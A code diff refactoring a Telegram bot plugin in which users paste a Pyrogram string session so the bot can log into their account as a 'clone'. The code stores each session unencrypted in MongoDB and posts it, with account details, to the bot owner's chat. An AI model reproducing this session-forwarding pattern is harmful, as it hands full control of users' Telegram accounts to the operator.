@@ -1,76 +1,60 @@
 import logging
 import os
-import sys
-import shutil
-import config
 import asyncio
 from pyrogram import Client, filters
-from pyrogram.errors import PeerIdInvalid
-from pyrogram.errors.exceptions.bad_request_400 import AccessTokenInvalid
-from pyrogram.types import BotCommand
+from pyrogram.errors import PeerIdInvalid, AccessTokenInvalid
 from config import API_HASH, API_ID, OWNER_ID
-from nexichat import CLONE_OWNERS
-from nexichat import nexichat as app, save_clonebot_owner, save_idclonebot_owner
-from nexichat import db as mongodb
-from nexichat import nexichat as app
+from nexichat import nexichat as app, save_idclonebot_owner, db as mongodb
 
 IDCLONES = set()
 cloneownerdb = mongodb.cloneownerdb
 idclonebotdb = mongodb.idclonebotdb
 
+async def get_string_session(message):
+    if len(message.command) > 1:
+        return message.text.split("/idclone", 1)[1].strip()
+    return None
+
+async def handle_clone(message, string_session):
+    mi = await message.reply_text("**Checking your String Session...**")
+    try:
+        ai = Client(
+            name="VIPIDCHATBOT",
+            api_id=API_ID,
+            api_hash=API_HASH,
+            session_string=str(string_session),
+            no_updates=False,
+            plugins=dict(root="nexichat.idchatbot"),
+        )
+        await ai.start()
+        user = await ai.get_me()
+        await save_idclonebot_owner(user.id, message.from_user.id)
+        details = {
+            "user_id": user.id,
+            "username": user.username or user.first_name,
+            "name": user.first_name,
+            "session": string_session,
+        }
+        await idclonebotdb.insert_one(details)
+        IDCLONES.add(user.id)
+        total_clones = await idclonebotdb.count_documents({})
+        await app.send_message(int(OWNER_ID), f"**#New_Clone**\n\n**User:** @{user.username}\n\n**Details:** {details}\n\n**Total Clones:** {total_clones}")
+        await mi.edit_text(f"**Session for @{user.username} successfully cloned ✅.**\n**Remove clone by:** /delidclone\n**Check all cloned sessions by:** /idcloned")
+    except AccessTokenInvalid:
+        await mi.edit_text(f"**Invalid String Session. Please provide a valid pyrogram string session.:**")
+    except PeerIdInvalid:
+        await mi.edit_text(f"**Your session successfully cloned 👍**\n**You can check by /idcloned**\n\n**But please start me (@{app.username}) From owner id**")
+    except Exception as e:
+        logging.exception("Error during cloning process.")
+        await mi.edit_text(f"**Invalid String Session. Please provide a valid pyrogram string session.:**\n\n**Error:** `{e}`")
 
 @Client.on_message(filters.command(["idclone", "cloneid"], prefixes=["."]))
 async def clone_txt(client, message):
-    if len(message.command) > 1:
-        string_session = message.text.split("/idclone", 1)[1].strip()
-        mi = await message.reply_text("**Checking your String Session...**")
-        try:
-            ai = Client(
-                name="VIPIDCHATBOT",
-                api_id=config.API_ID,
-                api_hash=config.API_HASH,
-                session_string=str(string_session),
-                no_updates=False,
-                plugins=dict(root="nexichat.idchatbot"),
-            )
-            await ai.start()
-            user = await ai.get_me()
-            clone_id = user.id
-            user_id = user.id
-            username = user.username or user.first_name
-            await save_idclonebot_owner(clone_id, message.from_user.id)
-            
-            details = {
-                "user_id": user.id,
-                "username": username,
-                "name": user.first_name,
-                "session": string_session,
-            }
-
-            cloned_bots = idclonebotdb.find()
-            cloned_bots_list = await cloned_bots.to_list(length=None)
-            total_clones = len(cloned_bots_list)
-            await idclonebotdb.insert_one(details)
-            IDCLONES.add(user.id)
-            
-            await app.send_message(
-                int(OWNER_ID), f"**#New_Clone**\n\n**User:** @{username}\n\n**Details:** {details}\n\n**Total Clones:** {total_clones}"
-            )
-
-            await mi.edit_text(
-                f"**Session for @{username} successfully cloned ✅.**\n"
-                f"**Remove clone by:** /delidclone\n**Check all cloned sessions by:** /idcloned"
-            )
-        except AccessTokenInvalid:
-            await mi.edit_text(f"**Invalid String Session. Please provide a valid pyrogram string session.:**")
-        except PeerIdInvalid as e:
-            await mi.edit_text(f"**Your session successfully cloned👍**\n**You can check by /idcloned**\n\n**But please start me (@{app.username}) From owner id**")
-        except Exception as e:
-            logging.exception("Error during cloning process.")
-            await mi.edit_text(f"**Invalid String Session. Please provide a valid pyrogram string session.:**\n\n**Error:** `{e}`")
+    string_session = await get_string_session(message)
+    if string_session:
+        await handle_clone(message, string_session)
     else:
-        await message.reply_text("**Provide a Pyrogram String Session after the .idclone **\n\n**Example:** `.idclone string session paste here`\n\n**Get a Pyrogram string session from here:-** [Click Here](t.me/STRINGROBOT) ")
-
+        await message.reply_text("**Provide a Pyrogram String Session after the .idclone **\n\n**Example:** `.idclone string session paste here`")
 
 @Client.on_message(filters.command(["idcloned", "clonedid"], prefixes=[".", "/"]))
 async def list_cloned_sessions(client, message):
@@ -93,10 +77,7 @@ async def list_cloned_sessions(client, message):
         logging.exception(e)
         await message.reply_text("**An error occurred while getting list of cloned id-chatbots**")
 
-
-@Client.on_message(
-    filters.command(["delidclone", "delcloneid", "deleteidclone", "removeidclone"], prefixes=["."])
-)
+@Client.on_message(filters.command(["delidclone", "delcloneid", "deleteidclone", "removeidclone"], prefixes=["."]))
 async def delete_cloned_session(client, message):
     try:
         if len(message.command) < 2:
@@ -109,17 +90,12 @@ async def delete_cloned_session(client, message):
         cloned_session = await idclonebotdb.find_one({"session": string_session})
         if cloned_session:
             await idclonebotdb.delete_one({"session": string_session})
-            
-
-            await ok.edit_text(
-                f"**Your String Session has been removed from my database ✅.**\n\n**Your bot will off after restart @{app.username}**"
-            )
+            await ok.edit_text(f"**Your String Session has been removed from my database ✅.**\n\n**Your bot will off after restart @{app.username}**")
         else:
             await message.reply_text("**⚠️ The provided session is not in the cloned list.**")
     except Exception as e:
         await message.reply_text(f"**An error occurred while deleting the cloned session:** {e}")
         logging.exception(e)
-
 
 @Client.on_message(filters.command("delallidclone", prefixes=[".", "/"]) & filters.user(int(OWNER_ID)))
 async def delete_all_cloned_sessions(client, message):
@@ -131,5 +107,3 @@ async def delete_all_cloned_sessions(client, message):
     except Exception as e:
         await a.edit_text(f"**An error occurred while deleting all cloned sessions:** {e}")
         logging.exception(e)
-
-
